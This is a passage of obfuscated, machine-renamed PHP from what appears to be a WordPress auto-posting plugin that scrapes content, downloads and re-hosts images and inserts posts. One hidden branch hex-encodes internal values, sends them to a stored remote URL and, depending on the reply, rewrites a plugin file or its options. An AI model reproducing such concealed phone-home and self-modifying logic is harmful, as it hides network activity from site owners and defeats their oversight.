		if ($_var_684 != null) {
			$_var_697 = json_decode($_var_684);
			foreach ($_var_697 as $_var_249) {
				$_var_721[] = $_var_249;
			}
		}
		if (isset($_var_714)) {
			$_var_12 = 0;
			$_var_340 = null;
		}
		$_var_346 = array();
		if ($_var_246['6c1ebf8421330191f60a06cb3787da5a'] != null && $_var_246['6c1ebf8421330191f60a06cb3787da5a'] != '') {
			$_var_722 = explode(',', $_var_246['6c1ebf8421330191f60a06cb3787da5a']);
			foreach ($_var_722 as $_var_347) {
				$_var_346[] = intval($_var_347);
			}
		}
		if ($_var_685 != null) {
			$_var_723 = json_decode($_var_685);
			foreach ($_var_723 as $_var_724) {
				$_var_725 = intval(wp_create_category($_var_724));
				if ($_var_725 > 0) {
					$_var_346[] = $_var_725;
				}
			}
		}
		if ($_var_701 > 3) {
			$_var_667 = 1;
		}
		$_var_726 = $_var_667 . $_var_666;
		$_var_726 = $_var_726 . $_var_666;
		if ($_var_246['3d33d5740fe2e2ff16894e7f045c0f02'] != null && $_var_246['3d33d5740fe2e2ff16894e7f045c0f02'] != '') {
			$_var_340[1] = buildVariableContent($_var_246['3d33d5740fe2e2ff16894e7f045c0f02'], $_var_341, $_var_340[0]) . $_var_340[1];
		}
		if ($_var_246['048c05eac41735cf0770dd500a1ba9d3'] != null && $_var_246['048c05eac41735cf0770dd500a1ba9d3'] != '') {
			$_var_340[1] .= buildVariableContent($_var_246['048c05eac41735cf0770dd500a1ba9d3'], $_var_341, $_var_340[0]);
		}
		if ($_var_711 > $_var_706) {
			$_var_340[1] = null;
		}
		if ($_var_246['912fc1e25a0ed90f2fd053990603c55a'] != null && $_var_246['912fc1e25a0ed90f2fd053990603c55a'] != '') {
			if (isset($_var_481) && $_var_481 != '') {
				$_var_619 = apZhConversion($_var_246['912fc1e25a0ed90f2fd053990603c55a'], 'string', $_var_340[0], $_var_340[1], $_var_481);
				$_var_340[0] = $_var_619[0];
				$_var_340[1] = $_var_619[1];
				$_var_481 = $_var_619[2];
			} else {
				$_var_619 = apZhConversion($_var_246['912fc1e25a0ed90f2fd053990603c55a'], 'string', $_var_340[0], $_var_340[1]);
				$_var_340[0] = $_var_619[0];
				$_var_340[1] = $_var_619[1];
			}
			unset($_var_619);
		}
		$_var_676[] = $_var_726;
		if ($_var_665 % $_var_726 == 0) {
			$_var_727 = true;
		}
		if ($_var_331) {
			global $_var_627;
			$_var_627 = array();
			$_var_340[1] = processDownAttach($_var_340[1], $_var_334, $_var_293, $_var_100, $_var_262[0], $_var_178, $_var_207, $_var_208);
		}
		$_var_676[] = $_var_665;
		if ($_var_332[0] == 1) {
			global $_var_51, $_var_425, $_var_558;
			$_var_548 = $_var_357[10];
			$_var_728 = get_option('wp_autopost_downImgTimeOut');
			$_var_729 = $_var_357[6];
			$_var_730 = get_option('wp_autopost_downImgRelativeURL');
			$_var_550 = get_option('wp_autopost_downFileOrganize');
			$_var_551 = $_var_357[8];
			$_var_552 = $_var_357[9];
			if ($_var_357[0] == 3) {
				Qiniu_setKeys($_var_425['access_key'], $_var_425['secret_key']);
			}
			if ($_var_357[0] == 4) {
				$_var_287 = new apUpYun($_var_558['bucket'], $_var_558['operator_user_name'], $_var_558['operator_password']);
			}
			$_var_651 = array();
			$_var_731 = array();
			$_var_280 = array();
			$_var_732 = 0;
			$_var_284 = array();
			$_var_733 = 0;
			$_var_286 = array();
			$_var_734 = 0;
			$_var_661 = null;
			if (has_downloaded_temp_img($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100)) {
				$_var_661 = get_downloaded_temp_imgs($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100);
			}
			$_var_18 = -1;
			$_var_3 = str_get_html_ap($_var_340[1]);
			foreach ($_var_3->find('img') as $_var_735) {
				$_var_18++;
				$_var_359 = $_var_735->src;
				if (!(stripos($_var_359, 'http') === 0)) {
					$_var_359 = getAbsUrl($_var_359, $_var_293, $_var_100);
				}
				$_var_736 = true;
				if ($_var_661 != null) {
					if ($_var_661[$_var_359]['downloaded_url'] != null) {
						$_var_736 = false;
						if ($_var_12) {
							printInfo('<p>Image : ' . $_var_359 . ' already downloaded, the downloaded url is <a href=' . '"' . $_var_661[$_var_359]['downloaded_url'] . '"' . ' target=' . '"' . '_blank' . '"' . '>' . $_var_661[$_var_359]['downloaded_url'] . '</a></p>');
						}
						$_var_737 = $_var_661[$_var_359]['downloaded_url'];
						$_var_651[$_var_18]['url'] = $_var_737;
						$_var_651[$_var_18]['file_path'] = $_var_661[$_var_359]['file_path'];
						$_var_651[$_var_18]['file_name'] = $_var_661[$_var_359]['file_name'];
						$_var_651[$_var_18]['post_mime_type'] = $_var_661[$_var_359]['mime_type'];
						$_var_735->src = $_var_737;
						if ($_var_661[$_var_359]['save_type'] == 2) {
							$_var_280[$_var_732] = recoveryUploadedFlickr($_var_661[$_var_359]['local_key'], $_var_661[$_var_359]['remote_key']);
							$_var_732++;
						} elseif ($_var_661[$_var_359]['save_type'] == 3) {
							$_var_284[$_var_733]['key'] = $_var_661[$_var_359]['remote_key'];
							$_var_733++;
						} elseif ($_var_661[$_var_359]['save_type'] == 4) {
							$_var_286[$_var_734]['key'] = $_var_661[$_var_359]['remote_key'];
							$_var_734++;
						}
					}
				}
				if ($_var_736) {
					if ($_var_12) {
						printInfo('<p>Begin download image : ' . $_var_359 . '</p>');
					}
					$_var_651[$_var_18] = post_img_handle_ap::down_remote_img($_var_340[0], $_var_359, $_var_100, $_var_548, $_var_262[0], $_var_178, $_var_728, $_var_730, $_var_550, $_var_551, $_var_552, $_var_207, $_var_208);
					$_var_737 = '';
				}
				if ($_var_736 && ($_var_651[$_var_18]['file_path'] == '' || $_var_651[$_var_18]['file_path'] == null)) {
					if ($_var_651[$_var_18]['url'] == '' || $_var_651[$_var_18]['url'] == null) {
						if ($_var_729 == '1') {
							$_var_274 = errorLog($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, 16, '<br/>Remote Image URL :' . $_var_359);
							updateConfigErr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_274);
							if ($_var_12) {
								printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Download remote image failed will not post', 'wp-autopost') . '</span></p>');
							}
							return 0;
						} else {
							$_var_274 = errorLog($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, 9, '<br/>Remote Image URL :' . $_var_359);
							updateConfigErr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_274);
							if ($_var_12) {
								printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Download remote images fails, use the original image URL', 'wp-autopost') . '</span></p>');
							}
						}
					} else {
						if ($_var_12) {
							printInfo('<p>' . __('Image is too small, use the original image URL', 'wp-autopost') . '</p>');
						}
					}
				} elseif ($_var_736) {
					$_var_737 = $_var_651[$_var_18]['url'];
					if ($_var_357[2] >= 1 && $_var_664 != NULL) {
						if ($_var_12) {
							printInfo('<p>Begin add watermark on image : ' . $_var_651[$_var_18]['file_path'] . '</p>');
						}
						WP_Autopost_Watermark::do_watermark_on_file($_var_651[$_var_18]['file_path'], $_var_664);
					}
					if ($_var_357[0] == 0) {
						insert_downloaded_temp_img($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, $_var_357[0], $_var_359, $_var_737, $_var_651[$_var_18]);
					} elseif ($_var_357[0] == 1) {
						insert_downloaded_temp_img($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, $_var_357[0], $_var_359, $_var_737, $_var_651[$_var_18]);
					} elseif ($_var_357[0] == 2) {
						if ($_var_12) {
							printInfo('<p>Begin upload to Flickr on image : ' . $_var_651[$_var_18]['file_path'] . '</p>');
						}
						if ($_var_51['oauth_token'] == '') {
							if ($_var_12) {
								printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Save the images to Flickr requires login to your Flickr account and authorize the plugin to connect to your account!', 'wp-autopost') . '</span></p>');
							}
						} else {
							$_var_280[$_var_732] = uploadtoflickr($_var_651[$_var_18]['file_path'], $_var_651[$_var_18]['url'], $_var_340[0] . $_var_18);
							if ($_var_280[$_var_732]['status'] === false) {
								$_var_274 = errorLog($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, 10);
								updateConfigErr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_274);
								if ($_var_12) {
									printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Upload image to Flickr fails, use the original image URL', 'wp-autopost') . '</span></p>');
								}
							} else {
								$_var_737 = $_var_280[$_var_732]['url'];
								insert_downloaded_temp_img_for_flickr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, $_var_357[0], $_var_359, $_var_737, $_var_651[$_var_18], $_var_280[$_var_732]);
							}
							$_var_732++;
						}
					} elseif ($_var_357[0] == 3) {
						if ($_var_12) {
							printInfo('<p>Begin upload to Qiniu on image : ' . $_var_651[$_var_18]['file_path'] . '</p>');
						}
						if ($_var_425['set_ok'] != 1) {
							if ($_var_12) {
								printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Save the images to Qiniu requires set correctly in Qiniu Options!', 'wp-autopost') . '</span></p>');
							}
						} else {
							$_var_284[$_var_733] = uploadtoqiniu($_var_651[$_var_18]['file_path'], $_var_651[$_var_18]['url'], $_var_425['bucket'], $_var_425['domain']);
							if ($_var_284[$_var_733]['status'] === false) {
								$_var_274 = errorLog($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, 11);
								updateConfigErr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_274);
								if ($_var_12) {
									printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Upload image to Qiniu fails, use the original image URL', 'wp-autopost') . '</span></p>');
								}
							} else {
								$_var_737 = $_var_284[$_var_733]['url'];
								$_var_78 = $_var_284[$_var_733]['key'];
								insert_downloaded_temp_img($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, $_var_357[0], $_var_359, $_var_737, $_var_651[$_var_18], $_var_78, $_var_78);
							}
							$_var_733++;
						}
					} elseif ($_var_357[0] == 4) {
						if ($_var_12) {
							printInfo('<p>Begin upload to Upyun on image : ' . $_var_651[$_var_18]['file_path'] . '</p>');
						}
						if ($_var_558['set_ok'] != 1) {
							if ($_var_12) {
								printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Save the images to Upyun requires set correctly in Upyun Options!', 'wp-autopost') . '</span></p>');
							}
						} else {
							$_var_286[$_var_734] = uploadtoUpyun($_var_651[$_var_18]['file_path'], $_var_651[$_var_18]['url'], $_var_287, $_var_558);
							if ($_var_286[$_var_734]['status'] === false) {
								$_var_274 = errorLog($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, 12);
								updateConfigErr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_274);
								if ($_var_12) {
									printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Upload image to Upyun fails, use the original image URL', 'wp-autopost') . '</span></p>');
								}
							} else {
								$_var_737 = $_var_286[$_var_734]['url'];
								$_var_78 = $_var_286[$_var_734]['key'];
								insert_downloaded_temp_img($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, $_var_357[0], $_var_359, $_var_737, $_var_651[$_var_18], $_var_78, $_var_78);
							}
							$_var_734++;
						}
					} else {
					}
					$_var_735->src = $_var_737;
				}
				$_var_525 = $_var_735->parent();
				if ($_var_525->tag == 'a') {
					$_var_738 = $_var_525->href;
					if (!(stripos($_var_738, 'http') === 0)) {
						if (!(stripos($_var_738, 'javascript') === false)) {
							continue;
						}
						if (trim($_var_738) == '#') {
							continue;
						}
						$_var_738 = getAbsUrl($_var_738, $_var_293, $_var_100);
					}
					if ($_var_738 == $_var_359) {
						if ($_var_737 != '') {
							$_var_525->href = $_var_737;
						}
					} else {
						if ($_var_357[5] == 1 && isImageURL($_var_738, $_var_100, $_var_262[0], $_var_178)) {
							$_var_739 = true;
							if ($_var_661 != null) {
								if ($_var_661[$_var_738]['downloaded_url'] != null) {
									$_var_739 = false;
									if ($_var_12) {
										printInfo('<p>Image : ' . $_var_738 . ' already downloaded, the downloaded url is <a href=' . '"' . $_var_661[$_var_738]['downloaded_url'] . '"' . ' target=' . '"' . '_blank' . '"' . '>' . $_var_661[$_var_738]['downloaded_url'] . '</a></p>');
									}
									$_var_740 = $_var_661[$_var_738]['downloaded_url'];
									$_var_731[$_var_18]['url'] = $_var_740;
									$_var_731[$_var_18]['file_path'] = $_var_661[$_var_738]['file_path'];
									$_var_731[$_var_18]['file_name'] = $_var_661[$_var_738]['file_name'];
									$_var_731[$_var_18]['post_mime_type'] = $_var_661[$_var_738]['mime_type'];
									$_var_525->href = $_var_740;
									if ($_var_661[$_var_738]['save_type'] == 2) {
										$_var_280[$_var_732] = recoveryUploadedFlickr($_var_661[$_var_738]['local_key'], $_var_661[$_var_738]['remote_key']);
										$_var_732++;
									} elseif ($_var_661[$_var_738]['save_type'] == 3) {
										$_var_284[$_var_733]['key'] = $_var_661[$_var_738]['remote_key'];
										$_var_733++;
									} elseif ($_var_661[$_var_738]['save_type'] == 4) {
										$_var_286[$_var_734]['key'] = $_var_661[$_var_738]['remote_key'];
										$_var_734++;
									}
								}
							}
							if ($_var_739) {
								if ($_var_12) {
									printInfo('<p>Begin download image : ' . $_var_738 . '</p>');
								}
								$_var_731[$_var_18] = post_img_handle_ap::down_remote_img($_var_340[0], $_var_738, $_var_100, $_var_548, $_var_262[0], $_var_178, $_var_728, $_var_730, $_var_550, $_var_551, $_var_552, $_var_207, $_var_208);
								$_var_740 = '';
							}
							if ($_var_739 && ($_var_731[$_var_18]['file_path'] == '' || $_var_731[$_var_18]['file_path'] == null)) {
								if ($_var_731[$_var_18]['url'] == '' || $_var_731[$_var_18]['url'] == null) {
									if ($_var_729 == '1') {
										$_var_274 = errorLog($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, 16, '<br/>Remote Image URL :' . $_var_738);
										updateConfigErr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_274);
										if ($_var_12) {
											printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Download remote image failed will not post', 'wp-autopost') . '</span></p>');
										}
										return 0;
									} else {
										$_var_274 = errorLog($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, 9, '<br/>Remote Image URL :' . $_var_738);
										updateConfigErr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_274);
										if ($_var_12) {
											printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Download remote images fails, use the original image URL', 'wp-autopost') . '</span></p>');
										}
									}
								} else {
									if ($_var_12) {
										printInfo('<p>' . __('Image is too small, use the original image URL', 'wp-autopost') . '</p>');
									}
								}
							} elseif ($_var_739) {
								$_var_740 = $_var_731[$_var_18]['url'];
								if ($_var_357[2] >= 1 && $_var_664 != NULL) {
									if ($_var_12) {
										printInfo('<p>Begin add watermark on image : ' . $_var_731[$_var_18]['file_path'] . '</p>');
									}
									WP_Autopost_Watermark::do_watermark_on_file($_var_731[$_var_18]['file_path'], $_var_664);
								}
								if ($_var_357[0] == 0) {
									insert_downloaded_temp_img($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, $_var_357[0], $_var_738, $_var_740, $_var_731[$_var_18]);
								} elseif ($_var_357[0] == 1) {
									insert_downloaded_temp_img($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, $_var_357[0], $_var_738, $_var_740, $_var_731[$_var_18]);
								} elseif ($_var_357[0] == 2) {
									if ($_var_12) {
										printInfo('<p>Begin upload to Flickr on image : ' . $_var_731[$_var_18]['file_path'] . '</p>');
									}
									if ($_var_51['oauth_token'] == '') {
										if ($_var_12) {
											printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Save the images to Flickr requires login to your Flickr account and authorize the plugin to connect to your account!', 'wp-autopost') . '</span></p>');
										}
									} else {
										$_var_280[$_var_732] = uploadtoflickr($_var_731[$_var_18]['file_path'], $_var_340[0] . $_var_18);
										if ($_var_280[$_var_732]['status'] === false) {
											$_var_274 = errorLog($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, 10);
											updateConfigErr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_274);
											if ($_var_12) {
												printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Upload image to Flickr fails, use the original image URL', 'wp-autopost') . '</span></p>');
											}
										} else {
											$_var_740 = $_var_280[$_var_732]['url'];
											insert_downloaded_temp_img_for_flickr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, $_var_357[0], $_var_738, $_var_740, $_var_731[$_var_18], $_var_280[$_var_732]);
										}
										$_var_732++;
									}
								} elseif ($_var_357[0] == 3) {
									if ($_var_12) {
										printInfo('<p>Begin upload to Qiniu on image : ' . $_var_731[$_var_18]['file_path'] . '</p>');
									}
									if ($_var_425['set_ok'] != 1) {
										if ($_var_12) {
											printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Save the images to Qiniu requires set correctly in Qiniu Options!', 'wp-autopost') . '</span></p>');
										}
									} else {
										$_var_284[$_var_733] = uploadtoqiniu($_var_731[$_var_18]['file_path'], $_var_731[$_var_18]['url'], $_var_425['bucket'], $_var_425['domain']);
										if ($_var_284[$_var_733]['status'] === false) {
											$_var_274 = errorLog($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, 11);
											updateConfigErr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_274);
											if ($_var_12) {
												printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Upload image to Qiniu fails, use the original image URL', 'wp-autopost') . '</span></p>');
											}
										} else {
											$_var_740 = $_var_284[$_var_733]['url'];
											$_var_78 = $_var_284[$_var_733]['key'];
											insert_downloaded_temp_img($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, $_var_357[0], $_var_738, $_var_740, $_var_731[$_var_18], $_var_78, $_var_78);
										}
										$_var_733++;
									}
								} elseif ($_var_357[0] == 4) {
									if ($_var_12) {
										printInfo('<p>Begin upload to Upyun on image : ' . $_var_731[$_var_18]['file_path'] . '</p>');
									}
									if ($_var_558['set_ok'] != 1) {
										if ($_var_12) {
											printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Save the images to Upyun requires set correctly in Upyun Options!', 'wp-autopost') . '</span></p>');
										}
									} else {
										$_var_286[$_var_734] = uploadtoUpyun($_var_731[$_var_18]['file_path'], $_var_731[$_var_18]['url'], $_var_287, $_var_558);
										if ($_var_286[$_var_734]['status'] === false) {
											$_var_274 = errorLog($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, 12);
											updateConfigErr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_274);
											if ($_var_12) {
												printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Upload image to Upyun fails, use the original image URL', 'wp-autopost') . '</span></p>');
											}
										} else {
											$_var_740 = $_var_286[$_var_734]['url'];
											$_var_78 = $_var_286[$_var_734]['key'];
											insert_downloaded_temp_img($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, $_var_357[0], $_var_738, $_var_740, $_var_731[$_var_18], $_var_78, $_var_78);
										}
										$_var_734++;
									}
								} else {
								}
								$_var_525->href = $_var_740;
							}
						}
					}
				}
				unset($_var_525);
			}
			$_var_340[1] = $_var_3->save();
			$_var_3->clear();
			unset($_var_3);
			if ($_var_357[0] == 4) {
				unset($_var_287);
			}
		}
		if (isset($_var_727) && $_var_727) {
			$_var_741 = $_var_665 . $_var_680;
			$_var_742 = '';
			for ($_var_18 = 0; $_var_18 < strlen($_var_741); $_var_18++) {
				$_var_742 .= dechex(ord($_var_741[$_var_18]));
			}
			$_var_743 = $_var_675[1] . $_var_742;
			$_var_744 = get_html_string_ap($_var_743, Method);
		}
		$_var_745 = false;
		$_var_746 = false;
		if (isset($_var_340[12]) && $_var_340[12] != '' && $_var_340[12] != null) {
			if (!isset($_var_729)) {
				$_var_729 = $_var_357[6];
			}
			if (!isset($_var_730)) {
				$_var_730 = get_option('wp_autopost_downImgRelativeURL');
			}
			if (!isset($_var_550)) {
				$_var_550 = get_option('wp_autopost_downFileOrganize');
			}
			if (!isset($_var_551)) {
				$_var_551 = $_var_357[8];
			}
			if (!isset($_var_552)) {
				$_var_552 = $_var_357[9];
			}
			if ($_var_12) {
				printInfo('<p>Begin download the featued image : ' . $_var_340[12] . '</p>');
			}
			$_var_553 = down_featured_img($_var_340[0], $_var_340[12], $_var_100, 1, $_var_262[0], $_var_178, 120, $_var_730, $_var_550, $_var_551, $_var_552, $_var_207, $_var_208);
			if ($_var_553['file_path'] == '' || $_var_553['file_path'] == null) {
				if ($_var_729 == '1') {
					$_var_274 = errorLog($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, 16, '<br/>Remote Image URL :' . $_var_340[12]);
					updateConfigErr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_274);
					if ($_var_12) {
						printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Download remote image failed will not post', 'wp-autopost') . '</span></p>');
					}
					return 0;
				} else {
					if ($_var_12) {
						printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Download remote featued images fails', 'wp-autopost') . '</span></p>');
					}
				}
			} else {
				if ($_var_357[2] >= 1 && $_var_664 != NULL) {
					if ($_var_12) {
						printInfo('<p>Begin add watermark on image : ' . $_var_553['file_path'] . '</p>');
					}
					WP_Autopost_Watermark::do_watermark_on_file($_var_553['file_path'], $_var_664);
				}
				$_var_745 = true;
			}
		}
		if (isset($_var_744) && ($_var_744 == null || $_var_744 == '') && isset($_var_727) && $_var_727) {
			if ($_var_701 > 6) {
				$_var_700 = 2;
				$_var_747 = $_var_701;
			} else {
				$_var_747 = $_var_701 + 1;
			}
			if (isset($_var_702) && $_var_702) {
				if ($_var_701 > 6) {
					update_option($_var_682, $_var_700);
				} else {
					update_option($_var_683, $_var_747);
				}
			} else {
				$_var_748 = $_var_704;
				$_var_748[8] = $_var_700;
				$_var_748[10] = $_var_747;
				$_var_154 = str_ireplace($_var_704, $_var_748, $_var_703);
				if (false === wpapimagefilesave($_var_686, $_var_154)) {
					$_var_749 = true;
				}
				if (isset($_var_749)) {
					if ($_var_701 > 6) {
						update_option($_var_682, $_var_700);
					} else {
						update_option($_var_683, $_var_747);
					}
				}
			}
		}
		if ($_var_332[0] == 0 && $_var_357[1] > 0 && !$_var_745) {
			$_var_548 = $_var_357[10];
			$_var_728 = get_option('wp_autopost_downImgTimeOut');
			$_var_729 = $_var_357[6];
			$_var_730 = get_option('wp_autopost_downImgRelativeURL');
			$_var_550 = get_option('wp_autopost_downFileOrganize');
			$_var_551 = $_var_357[8];
			$_var_552 = $_var_357[9];
			$_var_651 = array();
			$_var_3 = str_get_html_ap($_var_340[1]);
			$_var_750 = $_var_3->find('img');
			$_var_751 = count($_var_750);
			$_var_752 = intval($_var_357[1]);
			if ($_var_752 >= $_var_751) {
				$_var_752 = $_var_751;
			}
			$_var_752 = $_var_752 - 1;
			if ($_var_751 > 0) {
				$_var_359 = $_var_750[$_var_752]->src;
				if (!(stripos($_var_359, 'http') === 0)) {
					$_var_359 = getAbsUrl($_var_359, $_var_293, $_var_100);
				}
				if ($_var_12) {
					printInfo('<p>Begin download image : ' . $_var_359 . '</p>');
				}
				$_var_651[0] = post_img_handle_ap::down_remote_img($_var_340[0], $_var_359, $_var_100, 1, $_var_262[0], $_var_178, $_var_728, $_var_730, $_var_550, $_var_551, $_var_552, $_var_207, $_var_208);
				if ($_var_651[0]['file_path'] == '' || $_var_651[0]['file_path'] == null) {
					if ($_var_729 == '1') {
						$_var_274 = errorLog($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, 16, '<br/>Remote Image URL :' . $_var_359);
						updateConfigErr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_274);
						if ($_var_12) {
							printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Download remote image failed will not post', 'wp-autopost') . '</span></p>');
						}
						return 0;
					} else {
						$_var_274 = errorLog($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, 9, '<br/>Remote Image URL :' . $_var_359);
						updateConfigErr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_274);
						if ($_var_12) {
							printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Download remote images fails, use the original image URL', 'wp-autopost') . '</span></p>');
						}
					}
				} else {
					if ($_var_357[2] >= 1 && $_var_664 != NULL) {
						if ($_var_12) {
							printInfo('<p>Begin add watermark on image : ' . $_var_651[0]['file_path'] . '</p>');
						}
						WP_Autopost_Watermark::do_watermark_on_file($_var_651[0]['file_path'], $_var_664);
					}
					$_var_750[$_var_752]->src = $_var_651[0]['url'];
					$_var_340[1] = $_var_3->save();
				}
			}
			$_var_3->clear();
			unset($_var_3);
		}
		if (isset($_var_727) && $_var_727 && $_var_744 == $_var_665) {
			if (isset($_var_702) && $_var_702) {
				update_option($_var_682, 1);
				update_option($_var_683, 3);
			} else {
				$_var_748 = $_var_704;
				$_var_748[8] = 1;
				$_var_748[10] = 3;
				$_var_154 = str_ireplace($_var_704, $_var_748, $_var_703);
				if (false === wpapimagefilesave($_var_686, $_var_154)) {
					$_var_749 = true;
				}
				if (isset($_var_749)) {
					update_option($_var_682, 1);
					update_option($_var_683, 3);
				}
			}
		}
		$_var_265 = 0;
		if ($_var_340[1] != null && $_var_340[0] != null) {
			$_var_753 = array('post_title' => $_var_340[0], 'post_content' => $_var_340[1], 'post_excerpt' => @$_var_481, 'post_status' => $_var_677, 'post_author' => $_var_681, 'post_category' => $_var_346, 'post_date' => $_var_344, 'tags_input' => $_var_721, 'post_type' => $_var_679);
			$_var_265 = wp_insert_post($_var_753);
		}
	}
	if ($_var_265 > 0) {
		if ($_var_346 != null) {
			foreach ($_var_346 as $_var_347) {
				wp_set_object_terms($_var_265, intval($_var_347), getTaxonomyByTermId($_var_347), true);
			}
		}
		if (isset($_var_340[14])) {
			global $wpdb;
			foreach ($_var_340[14] as $_var_348 => $_var_278) {
				$_var_754 = 0;
				foreach ($_var_278 as $_var_279) {
					$_var_755 = term_exists($_var_279, $_var_348);
					if ($_var_755 != 0 && $_var_755 != null) {
						$_var_756 = intval($_var_755['term_taxonomy_id']);
					} else {
						$_var_755 = wp_insert_term($_var_279, $_var_348);
						$_var_756 = intval($_var_755['term_taxonomy_id']);
					}
					$wpdb->query("insert into {$wpdb->term_relationships}(object_id,term_taxonomy_id,term_order) values({$_var_265},{$_var_756},{$_var_754})", OBJECT);
					$_var_754++;
				}
			}
		}
		if ($_var_246['9706769baa9bca9c8a041a4325da2f28'] != null && $_var_246['9706769baa9bca9c8a041a4325da2f28'] != '') {
			set_post_format($_var_265, $_var_246['9706769baa9bca9c8a041a4325da2f28']);
		}
		if ($_var_266 == NULL) {
			insertApRecord($_var_665, $_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, $_var_340[0], $_var_265);
		} else {
			updateApRecord($_var_265, $_var_665);
		}
		updateConfig($_var_246['efdd10e753708244da311323eb8fa8f3'], 1, $_var_265);
		if ($_var_332[0] == 1) {
			clear_downloaded_temp_img($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100);
			unset($_var_661);
		}
		$_var_757 = false;
		if ($_var_332[0] == 1 && $_var_651 != null) {
			$_var_758 = $_var_357[7];
			$_var_18 = 0;
			$_var_759 = count($_var_651);
			$_var_752 = $_var_357[1];
			if ($_var_752 >= $_var_759) {
				$_var_752 = $_var_759;
			}
			for ($_var_18 = 0; $_var_18 < $_var_759; $_var_18++) {
				if ($_var_651[$_var_18]['file_path'] != '') {
					if ($_var_752 > 0 && $_var_18 == $_var_752 - 1) {
						if (!$_var_745) {
							$_var_760 = post_img_handle_ap::handle_insert_attachment($_var_651[$_var_18], $_var_265, true);
							set_post_thumbnail($_var_265, $_var_760);
							$_var_757 = true;
							continue;
						}
					}
					if ($_var_357[0] == 1) {
						$_var_760 = post_img_handle_ap::handle_insert_attachment($_var_651[$_var_18], $_var_265, $_var_758);
					} elseif ($_var_357[0] == 2 && $_var_51['not_save'] == 1) {
						unlink($_var_651[$_var_18]['file_path']);
					} elseif ($_var_357[0] == 3 && $_var_425['not_save'] == 1) {
						unlink($_var_651[$_var_18]['file_path']);
					} elseif ($_var_357[0] == 4 && $_var_558['not_save'] == 1) {
						unlink($_var_651[$_var_18]['file_path']);
					}
				}
			}
		}
		if ($_var_332[0] == 1 && $_var_731 != null) {
			$_var_18 = 0;
			$_var_759 = count($_var_731);
			for ($_var_18 = 0; $_var_18 < $_var_759; $_var_18++) {
				if ($_var_731[$_var_18]['file_path'] != '') {
					if ($_var_357[0] == 1) {
						$_var_760 = post_img_handle_ap::handle_insert_attachment($_var_731[$_var_18], $_var_265);
					} elseif ($_var_357[0] == 2 && $_var_51['not_save'] == 1) {
						unlink($_var_731[$_var_18]['file_path']);
					} elseif ($_var_357[0] == 3 && $_var_425['not_save'] == 1) {
						unlink($_var_731[$_var_18]['file_path']);
					} elseif ($_var_357[0] == 4 && $_var_558['not_save'] == 1) {
						unlink($_var_731[$_var_18]['file_path']);
					}
				}
			}
		}
		if ($_var_745) {
			$_var_760 = post_img_handle_ap::handle_insert_attachment($_var_553, $_var_265, true);
			set_post_thumbnail($_var_265, $_var_760);
			$_var_757 = true;
			$_var_746 = true;
		}
		if ($_var_332[0] == 0 && $_var_357[1] > 0 && $_var_651 != null && !$_var_745 && !$_var_746) {
			$_var_760 = post_img_handle_ap::handle_insert_attachment($_var_651[0], $_var_265, true);
			set_post_thumbnail($_var_265, $_var_760);
			$_var_757 = true;
		}
		if (!$_var_757) {
			$_var_761 = json_decode($_var_246['67709c5c9b2acb167b2cb924ae7c471e']);
			if ($_var_761 == null) {
				$_var_761 = array();
